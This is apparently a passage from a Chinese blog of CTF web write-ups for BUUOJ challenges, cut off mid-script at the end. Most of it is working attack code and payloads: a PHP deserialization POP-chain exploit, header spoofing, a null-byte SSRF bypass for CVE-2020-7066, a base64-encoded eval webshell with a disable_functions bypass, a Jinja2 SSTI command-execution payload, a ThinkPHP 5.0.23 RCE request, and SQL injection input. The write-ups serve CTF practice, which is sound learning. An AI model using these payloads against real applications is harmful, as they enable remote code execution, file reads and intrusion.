class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>利用Modifier中的include包含flag.php，需要控制$var的值和调用<code>__invoke</code>，而当对象当作函数使用时会调用<code>__invoke</code>，可以看到class Test中<code>__get</code>的方法可使成员作为函数使用，当访问不存在的成员变量时会调用<code>__get</code>，class Show中的<code>__toString</code>，会访问str中的source，所以使str为Test对象，这个对象中没有source，就会调用<code>__get</code>，当把对象当作字符串时会调用<code>__toString</code>，所以使source为show对象，当执行<code>__wakeup</code>即可调用<code>__toString</code>，pop链构造完毕。</p><pre class=" language-php"><code class="language-php">Show<span class="token operator">-</span><span class="token operator">></span><span class="token property">preg_match</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Test</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_get</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Modifier</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">__invoke</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="../../../../img/image-20200918224704562.png" alt="image-20200918224704562"></p><h2 id="MRCTF2020-Ezpop-Reveng"><a href="#MRCTF2020-Ezpop-Reveng" class="headerlink" title="[MRCTF2020]Ezpop_Reveng"></a>[MRCTF2020]Ezpop_Reveng</h2><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p><img src="../../../../img/image-20200918232440417.png" alt="image-20200918232440417"></p><p>使用php解析字符串的特性绕过 <a href="https://www.freebuf.com/news/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>payload</p><pre class=" language-php"><code class="language-php">b<span class="token operator">%</span>20u<span class="token operator">%</span>20p<span class="token operator">%</span>20t<span class="token operator">=</span><span class="token number">23333</span><span class="token operator">%</span><span class="token constant">0A</span></code></pre><p>b%20u%20p%20t经过处理后存入数组的值为b_u_p_t，%0A为换行符。</p><p><img src="../../../../img/image-20200918232742488.png" alt="image-20200918232742488"></p><p>访问secrettw.php，发现jsfuck。</p><p><img src="../../../../img/image-20200918232911443.png" alt="image-20200918232911443"></p><p>控制台运行</p><p><img src="../../../../img/image-20200918232847068.png" alt="image-20200918232847068"></p><p>post后获得源码</p><pre class=" language-php"><code class="language-php">Flag is here<span class="token operator">~</span>But how to get it<span class="token operator">?</span> <span class="token delimiter">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'takeip.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'Local access only!'</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"Your REQUEST is:"</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>  </code></pre><p>使用Client-IP伪造ip，使用data协议控制输入流，控制file_get_contents的值</p><blockquote><p>伪造ip：X-Client-IP: X-Remote-IP:  X-Remote-Addr: X-Originating-IP:  X-Forwarded-For:  client-ip:</p></blockquote><p><code>http://b436b6c5-e523-4aed-8075-c98d9a08f8fc.node3.buuoj.cn/secrettw.php?2333=data://,todat is a happy day&amp;file=flag.php</code></p><p><img src="../../../../img/image-20200918235034118.png" alt="image-20200918235034118"></p><p>编写加密函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">rechange</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token operator">=</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token variable">$v</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p><code>http://b436b6c5-e523-4aed-8075-c98d9a08f8fc.node3.buuoj.cn/secrettw.php?2333=data://,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=</code></p><p><img src="../../../../img/image-20200919001103090.png" alt="image-20200919001103090"></p><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p>CVE-2020-7066</p><p>get_headers()：可以通过服务器的响应头来判断远程文件是否存在</p><p>get_headers()会截断URL中空字符后的内容，也就是会截断%00后的字符</p><p><img src="../../../../img/image-20200921220222508.png" alt="image-20200921220222508"></p><p><code>http://fe290372-6178-4c81-8314-dd7f71ce1ec4.node3.buuoj.cn/?url=http://127.0.0.1%00www.ctfhub.com</code></p><p><img src="../../../../img/image-20200921220350279.png" alt="image-20200921220350279"></p><p>改为<code>http://fe290372-6178-4c81-8314-dd7f71ce1ec4.node3.buuoj.cn/?url=http://127.0.0.123%00www.ctfhub.com</code></p><p><img src="../../../../img/image-20200921220430173.png" alt="image-20200921220430173"></p><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Check_In<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>base64编码后可rce</p><p>phpinfo();  –&gt;  cGhwaW5mbygpOw==</p><p><code>http://85b78423-12a5-4619-9749-7e5ae23ad41c.node3.buuoj.cn/?Ginkgo=cGhwaW5mbygpOw==</code></p><p>查找disable_functions</p><p><img src="../../../../img/image-20200921222257051.png" alt="image-20200921222257051"></p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ZXZhbCgkX1BPU1RbMV0pOw<span class="token operator">==</span></code></pre><p><code>http://85b78423-12a5-4619-9749-7e5ae23ad41c.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></p><p>蚂剑连接，发现打不开根目录下的flag，但是有readflag文件</p><p>看wp发现环境为php7.3，可用用bypass PHP7.0-7.3 disable_function的<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">PoC</a></p><p>改下命令</p><p><img src="../../../../img/image-20200921224633828.png" alt="image-20200921224633828"></p><p>上传至temp目录（有上传权限），然后包含它。</p><p>payload</p><pre><code>http://85b78423-12a5-4619-9749-7e5ae23ad41c.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==POST：1=include(&#39;/tmp/exp.php&#39;);</code></pre><p><img src="../../../../img/image-20200921225743446.png" alt="image-20200921225743446"></p><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>jinja2 ssti</p><p>payload</p><pre class=" language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>a59cb797<span class="token number">-5668</span><span class="token operator">-</span><span class="token number">400c</span><span class="token operator">-</span>a511<span class="token operator">-</span>a4f94c890709<span class="token punctuation">.</span>node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>qaq?name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token operator">%</span>20for<span class="token operator">%</span><span class="token number">20c</span><span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token operator">%</span>20if<span class="token operator">%</span><span class="token number">20c.</span>__name__<span class="token operator">==</span><span class="token operator">%</span>27catch_warnings<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token number">20c.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token operator">%</span>27__builtins__<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token operator">%</span>22__import__<span class="token punctuation">(</span><span class="token operator">%</span>27os<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token operator">%</span>27cat<span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token operator">%</span>20endif<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token operator">%</span>20endfor<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token punctuation">}</span></code></pre><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>thinkphp5.0.23命令执行</p><p>payload</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//52bd483e-0bea-4679-b32b-1afd54ad8f9a.node3.buuoj.cn/</span><span class="token constant">POST</span><span class="token punctuation">:</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token constant">REQUEST_METHOD</span><span class="token punctuation">]</span><span class="token operator">=</span>cat <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag</code></pre><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><img src="../../../../img/image-20201010231730479.png" alt="image-20201010231730479"></p><p>扫描目录，发现<code>.DS_Store</code></p><pre><code>.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>下载后在Linux中cat  DS_Store </p><p><img src="../../../../img/image-20201010231912018.png" alt="image-20201010231912018"></p><p>输入L0gln.php，跳转至index.php，做了登录检测</p><p>随便输入用户名密码即可登录</p><p>输入L0gln.php，把time值改大</p><p><img src="../../../../img/image-20201010232106634.png" alt="image-20201010232106634"></p><p><img src="../../../../img/image-20201010232140927.png" alt="image-20201010232140927"></p><p>接下来也是一些header的限制，直接放出最终的包，可参考后面的header详解</p><p><img src="../../../../img/image-20201010233021768.png" alt="image-20201010233021768"></p><p><a href="https://www.cnblogs.com/benbenfishfish/p/5821091.html" target="_blank" rel="noopener">                                                                 Header:请求头参数详解        </a>             </p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:&#x75;&#x73;&#x65;&#114;&#x40;&#x65;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#x75;&#x73;&#x65;&#114;&#x40;&#x65;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com/" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p>发现hint.txt</p><p><img src="../../../../img/image-20201011191648605.png" alt="image-20201011191648605"></p><pre><code>username=&#39;a\&#39; and password=&#39;or 2&gt;1#&#39; </code></pre><p>使用脚本盲注</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://09a83584-46f6-4e80-ab85-83d5a1c8f99d.node3.buuoj.cn/"</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> 